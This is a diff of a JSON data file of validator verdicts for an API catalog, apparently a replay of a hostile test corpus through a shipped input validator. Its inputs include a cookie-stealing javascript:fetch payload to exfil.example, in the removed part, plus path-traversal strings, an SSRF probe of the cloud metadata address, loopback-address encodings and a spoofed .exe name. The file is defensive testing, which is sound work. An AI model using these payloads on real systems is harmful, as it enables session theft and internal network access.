@@ -1,66 +1,153 @@
-[
-  {
-    "minutesAgo": 3,
-    "verdict": "rejected",
-    "rule": "route-template/traversal",
-    "field": "routeTemplate",
-    "input": "/v1/parse/{id}/../../admin/keys",
-    "reason": "Traversal segment in route template — escapes the advertised resource prefix."
-  },
-  {
-    "minutesAgo": 9,
-    "verdict": "soft-drop",
-    "rule": "resource/icon-url-origin",
-    "field": "resource.iconUrl",
-    "input": "http://198.51.100.7/icon.png",
-    "reason": "Icon URL off the resource origin and not TLS — field dropped, record kept."
-  },
-  {
-    "minutesAgo": 14,
-    "verdict": "soft-drop",
-    "rule": "resource/tags-cardinality",
-    "field": "resource.tags",
-    "input": "[\"invoice\",\"inv\",\"invoices\", … 96 more]",
-    "reason": "Tag flood (99 > 16). Overflow truncated to contain index pollution."
-  },
-  {
-    "minutesAgo": 22,
-    "verdict": "rejected",
-    "rule": "payment/network-mismatch",
-    "field": "network",
-    "input": "eip155:8453",
-    "reason": "Network outside facilitator scope. Only stellar:testnet is indexed."
-  },
-  {
-    "minutesAgo": 31,
-    "verdict": "soft-drop",
-    "rule": "resource/description-length",
-    "field": "resource.description",
-    "input": "\"best api in the world …\" (18,204 chars)",
-    "reason": "Description over 2,000 chars — truncated before BM25 indexing."
-  },
-  {
-    "minutesAgo": 48,
-    "verdict": "rejected",
-    "rule": "route-template/scheme-injection",
-    "field": "routeTemplate",
-    "input": "javascript:fetch(\"//exfil.example/\"+document.cookie)",
-    "reason": "Route template is not a path — executable scheme refused."
-  },
-  {
-    "minutesAgo": 71,
-    "verdict": "rejected",
-    "rule": "payment/payto-checksum",
-    "field": "payTo",
-    "input": "GBADCAFE…INVALID",
-    "reason": "Stellar public key fails checksum — advertisement is not payable."
-  },
-  {
-    "minutesAgo": 95,
-    "verdict": "soft-drop",
-    "rule": "resource/tag-charset",
-    "field": "resource.tags",
-    "input": "[\"inv\\u0000oice\",\"<script>alert(1)</script>\"]",
-    "reason": "Null bytes and markup in tags — normalized out of the index."
-  }
-]
+{
+  "generatedAt": "2026-08-09T11:58:10.311Z",
+  "generator": "apps/web/scripts/gen-integrity.mjs",
+  "validator": "packages/index/src/integrity.mjs (via createCatalog().upsert)",
+  "commit": "a727ca9",
+  "note": "Replay of a fixed hostile corpus through the shipped validator. Every rule, verdict and reason below is the validator&apos;s own output. Not a live feed.",
+  "entries": [
+    {
+      "verdict": "rejected",
+      "rule": "resource.url",
+      "field": "resource.url",
+      "input": "javascript:alert(1)",
+      "reason": "resource.url is missing or invalid",
+      "survived": null,
+      "minutesAgo": 3
+    },
+    {
+      "verdict": "rejected",
+      "rule": "type",
+      "field": "type",
+      "input": "grpc",
+      "reason": "type must be one of http|mcp",
+      "survived": null,
+      "minutesAgo": 10
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "routeTemplate",
+      "field": "routeTemplate",
+      "input": "/v1/parse/:id/../../admin/keys",
+      "reason": "routeTemplate contains path traversal \"..\" after decoding",
+      "survived": "record kept",
+      "minutesAgo": 17
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "routeTemplate",
+      "field": "routeTemplate",
+      "input": "/v1/%252e%252e/thing",
+      "reason": "routeTemplate contains path traversal \"..\" after decoding",
+      "survived": "record kept",
+      "minutesAgo": 24
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "routeTemplate",
+      "field": "routeTemplate",
+      "input": "/v1/redirect/https%3A%2F%2Fexfil.example",
+      "reason": "routeTemplate contains \"://\" after decoding",
+      "survived": "record kept",
+      "minutesAgo": 31
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.iconUrl",
+      "field": "resource.iconUrl",
+      "input": "http://169.254.169.254/latest/meta-data/",
+      "reason": "iconUrl host rejected: IP literal host (decimal/octal/hex)",
+      "survived": "record kept",
+      "minutesAgo": 38
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.iconUrl",
+      "field": "resource.iconUrl",
+      "input": "http://2130706433/i.png",
+      "reason": "iconUrl host rejected: IP literal host (decimal/octal/hex)",
+      "survived": "record kept",
+      "minutesAgo": 45
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.iconUrl",
+      "field": "resource.iconUrl",
+      "input": "http://0177.0.0.1/i.png",
+      "reason": "iconUrl host rejected: IP literal host (decimal/octal/hex)",
+      "survived": "record kept",
+      "minutesAgo": 52
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.iconUrl",
+      "field": "resource.iconUrl",
+      "input": "http://[::1]/i.png",
+      "reason": "iconUrl host rejected: IPv6 / bracketed host literal",
+      "survived": "record kept",
+      "minutesAgo": 59
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.iconUrl",
+      "field": "resource.iconUrl",
+      "input": "https://user:pass@cdn.example.com/i.png",
+      "reason": "iconUrl must not contain userinfo",
+      "survived": "record kept",
+      "minutesAgo": 66
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.iconUrl",
+      "field": "resource.iconUrl",
+      "input": "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
+      "reason": "iconUrl scheme \"data:\" is not http/https",
+      "survived": "record kept",
+      "minutesAgo": 73
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.tags[5]:over-limit",
+      "field": "resource.tags",
+      "input": "[\"invoice\",\"inv\",\"invoices\", … 96 more]",
+      "reason": "99 tags submitted, catalog keeps 5 — overflow dropped to contain index pollution",
+      "survived": "record kept",
+      "minutesAgo": 80
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.tags[1]",
+      "field": "resource.tags",
+      "input": "[\"inv\\u0000oice\"]",
+      "reason": "tag contains control characters",
+      "survived": "record kept",
+      "minutesAgo": 87
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.description:truncated",
+      "field": "resource.description",
+      "input": "\"best api in the world …\" (18,204 chars)",
+      "reason": "description is 18,204 characters, catalog keeps 512 — truncated before BM25 indexing",
+      "survived": "record kept",
+      "minutesAgo": 94
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "resource.serviceName",
+      "field": "resource.serviceName",
+      "input": "payment-service\\u202Egnp.exe",
+      "reason": "serviceName contains non-printable-ASCII characters",
+      "survived": "record kept",
+      "minutesAgo": 101
+    },
+    {
+      "verdict": "soft-drop",
+      "rule": "input.schema",
+      "field": "input.schema",
+      "input": "{ \"$ref\": \"https://exfil.example/schema.json\" }",
+      "reason": "external reference not allowed: $.$ref = https://exfil.example/schema.json",
+      "survived": "record kept",
+      "minutesAgo": 108
+    }
+  ]
+}
